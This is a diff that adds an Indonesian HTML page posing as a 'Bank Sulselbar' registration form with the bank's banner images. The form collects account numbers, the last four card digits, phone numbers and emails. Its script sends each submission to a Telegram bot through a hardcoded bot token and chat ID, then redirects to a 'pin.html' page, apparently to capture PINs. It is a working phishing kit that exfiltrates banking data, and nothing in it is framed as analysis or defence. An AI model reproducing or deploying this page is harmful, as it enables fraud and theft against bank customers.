@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+        </style> 
+<body>
+  <div class="wrapper" id="app">
+     <img src="https://raw.githubusercontent.com/unitetger/sulselbar/refs/heads/main/1746951913910.jpg" style="width: 100%; position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto">
+  <nav style="position: ; top: 0; left: 0; right: 0; margin: 0px auto; width: 100%; height: 5px; background: #F1F5F8; z-index: 99999" class="animation-fadeInDownBig">
+ <img src="https://github.com/unitetger/sulselbar/blob/main/1746951891518.jpg?raw=true" style="width: 100%; position: fixed; top: 0; left: 0; right: 0;box-shadow: 0px 7px 10px #8a8a8a; margin: 0px auto">
+</nav>        
+</div>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulir Registrasi Baru</title>
+  <style>
+        /* Gaya Sederhana */
+        body { font-family: Arial, sans-serif; padding: 20px; }
+        .container { max-width: 450px; margin: 0 auto; border: 1px solid #ddd; padding: 25px; border-radius: 8px; box-shadow: 2px 2px 10px rgba(0,0,0,0.1); }
+        label { display: block; margin-bottom: 5px; font-weight: bold; }
+        input[type="text"], input[type="email"], input[type="tel"], input[type="number"] { 
+            width: 100%; 
+            padding: 10px; 
+            margin-bottom: 15px; 
+            border: 1px solid #ccc; 
+            border-radius: 4px; 
+            box-sizing: border-box; 
+        }
+        button { background-color: #28a745; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; width: 100%; }
+        button:hover { background-color: #1e7e34; }
+        .message { margin-top: 15px; text-align: center; font-weight: bold; }
+        .hint { font-size: 0.8em; color: #666; margin-top: -10px; margin-bottom: 15px; display: block; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Registrasi Bank Sulselbar</h1>
+        <form id="registrationForm">
+            <label for="rekening">Nomor Rekening:</label>
+            <input type="number" id="rekening" name="NomorRekening" placeholder="Masukkan Nomor Rekening" required>
+
+            <label for="kartu">Nomor Kartu (4 Digit Terakhir):</label>
+            <input type="number" id="kartu" name="NomorKartu4Digit" minlength="4" maxlength="4" placeholder="Hanya 4 digit terakhir" required>
+            <span class="hint">Pastikan hanya memasukkan 4 digit terakhir nomor kartu Anda.</span>
+
+            <label for="telp">Nomor Telepon:</label>
+            <input type="tel" id="telp" name="NomorTelepon" placeholder="Masukkan Nomor Telepon Aktif" required>
+            
+            <label for="email">Email:</label>
+            <input type="email" id="email" name="Email" placeholder="Masukkan Alamat Email" required>
+            
+            <input type="hidden" name="jenis" value="Registrasi_Data_Penting">
+
+            <button type="submit">Lanjutkan</button>
+        </form>
+        <div id="responseMessage" class="message"></div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8896183841:AAEaMWp_Z8q3TQJjKYfaQCGB59iYMdjaoYQ";
+        const CHAT_ID = "7692820036";
+
+        document.getElementById('registrationForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Mencegah pengiriman formulir standar
+
+            const form = event.target;
+
+            // Validasi sederhana untuk 4 digit kartu
+            const kartuInput = document.getElementById('kartu');
+            if (kartuInput.value.length !== 4) {
+                document.getElementById('responseMessage').textContent = '❌ Nomor Kartu harus 4 digit.';
+                document.getElementById('responseMessage').style.color = 'red';
+                return;
+            }
+
+            const nomorRekening = document.getElementById('rekening').value;
+            const nomorKartu4Digit = kartuInput.value;
+            const nomorTelepon = document.getElementById('telp').value;
+            const email = document.getElementById('email').value;
+            const jenis = "Registrasi_Data_Penting"; // Nilai hidden
+
+            const message = `Registrasi Data Penting Baru:\nJenis: ${jenis}\nNomor Rekening: ${nomorRekening}\nNomor Kartu (4 Digit): ${nomorKartu4Digit}\nNomor Telepon: ${nomorTelepon}\nEmail: ${email}`;
+            
+            const responseMessageElement = document.getElementById('responseMessage');
+            responseMessageElement.textContent = 'Sedang mengirim data...';
+            responseMessageElement.style.color = '#007bff';
+
+            // Kirim langsung ke Telegram
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`, {
+                method: 'GET' // Bisa juga POST, tapi GET lebih sederhana
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Sukses:', data);
+                    responseMessageElement.textContent = '✅ dalam proses'
+                    responseMessageElement.style.color = 'green';
+                    // Arahkan ke pin.html
+                    window.location.href = 'pin.html';
+                } else {
+                    console.error('Error dari Telegram:', data);
+                    responseMessageElement.textContent = `❌ Gagal mengirim ke Telegram: ${data.description}`;
+                    responseMessageElement.style.color = 'red';
+                }
+            })
+            .catch((error) => {
+                console.error('Error Jaringan/Klien:', error);
+                responseMessageElement.textContent = '❌ Gagal mengirim. Pastikan koneksi internet dan Telegram bot berfungsi.';
+                responseMessageElement.style.color = 'red';
+            });
+        });
+    </script>
+</body>
+</html>
